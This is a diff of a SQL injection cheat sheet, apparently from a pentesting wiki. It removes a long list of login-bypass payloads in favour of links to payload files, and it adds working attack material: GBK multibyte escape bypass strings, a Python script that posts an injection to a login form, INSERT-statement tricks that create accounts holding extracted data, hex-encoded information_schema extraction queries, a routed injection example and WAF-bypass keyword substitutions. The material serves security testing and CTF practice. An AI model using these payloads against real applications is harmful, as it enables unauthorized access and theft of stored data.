@@ -36,7 +36,7 @@ Simple characters
 )
 Wildcard (*)
 ```
-**Recommended:** [SQLi Error Detector](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_error_detector.txt)
+**Recommended list:** [SQLi Error Detector](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_error_detector.txt)
 
 Multiple encoding
 
@@ -226,100 +226,9 @@ tamper=name_of_the_tamper
 
 ## Authentication bypass
 
-```sql
-'-'
-' '
-'&'
-'^'
-'*'
-' or 1=1 limit 1 -- -+
-'="or'
-' or ''-'
-' or '' '
-' or ''&'
-' or ''^'
-' or ''*'
-'-||0'
-"-||0"
-"-"
-" "
-"&"
-"^"
-"*"
-" or ""-"
-" or "" "
-" or ""&"
-" or ""^"
-" or ""*"
-or true--
-" or true--
-' or true--
-") or true--
-') or true--
-' or 'x'='x
-') or ('x')=('x
-')) or (('x'))=(('x
-" or "x"="x
-") or ("x")=("x
-")) or (("x"))=(("x
-or 2 like 2
-or 1=1
-or 1=1--
-or 1=1#
-or 1=1/*
-admin' --
-admin' #
-admin'/*
-admin' or '2' LIKE '1
-admin' or 2 LIKE 2--
-admin' or 2 LIKE 2#
-admin') or 2 LIKE 2#
-admin') or 2 LIKE 2--
-admin') or ('2' LIKE '2
-admin') or ('2' LIKE '2'#
-admin') or ('2' LIKE '2'/*
-admin' or '1'='1
-admin' or '1'='1'--
-admin' or '1'='1'#
-admin' or '1'='1'/*
-admin'or 1=1 or ''='
-admin' or 1=1
-admin' or 1=1--
-admin' or 1=1#
-admin' or 1=1/*
-admin') or ('1'='1
-admin') or ('1'='1'--
-admin') or ('1'='1'#
-admin') or ('1'='1'/*
-admin') or '1'='1
-admin') or '1'='1'--
-admin') or '1'='1'#
-admin') or '1'='1'/*
-1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
-admin" --
-admin" #
-admin"/*
-admin" or "1"="1
-admin" or "1"="1"--
-admin" or "1"="1"#
-admin" or "1"="1"/*
-admin"or 1=1 or ""="
-admin" or 1=1
-admin" or 1=1--
-admin" or 1=1#
-admin" or 1=1/*
-admin") or ("1"="1
-admin") or ("1"="1"--
-admin") or ("1"="1"#
-admin") or ("1"="1"/*
-admin") or "1"="1
-admin") or "1"="1"--
-admin") or "1"="1"#
-admin") or "1"="1"/*
-1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
-```
+**Small lists recommended**: [AuthBypass1](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/Auth_Bypass.txt) and [AuthBypass2](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/Auth_Bypass2.txt)
 
-**Recommended** list for login bypass: [Authbypass](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_authbypass.txt)
+**Big list recommended** list for login bypass: [Authbypass](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_authbypass.txt)
 Try to inject each line of the list in the username and password at the same time.
 
 ## Authentication Bypass (Raw MD5)
@@ -338,19 +247,39 @@ md5("ffifdyop", true) = 'or'6�]��!r,��b
 
 Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)
 
-## Polyglot injection (multicontext)
 
-```sql
-SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
-```
-
-## Routed injection
+## Hash Authentication Bypass
 
 ```sql
 admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
 ```
 **Recomended**: [Passwd1234](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_passwd_1234.txt)
 Use as username each line of the file and as password *1234*.
+
+## GBK Authentication Bypass
+
+IF ' is being scaped you can use %A8%27, and when *'* gets scaped it will be created: 0xA80x5c0x27 (*╘'*)
+```sql
+%A8%27 OR 1=1;-- 2
+%8C%A8%27 OR 1=1-- 2
+%bf' or 1=1 -- --
+```
+
+Python script:
+```python
+import requests
+url = "http://example.com/index.php" 
+cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3') 
+datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"} 
+r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url}) 
+print r.text
+```
+
+## Polyglot injection (multicontext)
+
+```sql
+SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+```
 
 ## Insert Statement - ON DUPLICATE KEY UPDATE
 
@@ -368,6 +297,57 @@ Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL
 
 After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
 ```
+
+## Insert Statement - Extract information 
+
+### Creating 2 accounts at the same time
+
+When trying to create a new user and username, password and email are needed:
+
+```sql
+SQLi payload:
+username=TEST&password&=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -
+
+A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
+```
+
+### Using decimal or hexadecimal
+
+With this technique you can extract information creating only 1 account. It is important to note that you don't need to comment anything.
+
+Using **hex2dec** and **substr**:
+
+```sql
+'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
+```
+To get the text you can use:
+
+```python
+__import__('binascii').unhexlify(hex(215573607263)[2:])
+```
+
+Using **hex** and **replace** (and **substr**):
+
+```sql
+'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
+
+'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
+
+Full ascii uppercase and lowercase replace:
+'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
+```
+
+## Routed SQL injection
+Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output.
+[Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt)
+
+Example:
+
+```sql
+Hex of: -1' union select login,password from users-- a
+-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
+```
+
 
 ## WAF Bypass
 
@@ -413,11 +393,11 @@ Blacklist using keywords - bypass using uppercase/lowercase
 Blacklist using keywords case insensitive - bypass using an equivalent operator
 
 ```sql
-AND   -> &&
-OR    -> ||
+AND   -> && -> %26%26
+OR    -> || -> %7C%7C
 =     -> LIKE,REGEXP, not < and not >
 > X   -> not between 0 and X
-WHERE -> HAVING
+WHERE -> HAVING --> LIMIT X,1 --> group_concat(CASE(table_schema)When(database())Then(table_name)END) --> group_concat(if(table_schema=database(),table_name,null))
 ```
 
 Information_schema.tables Alternative
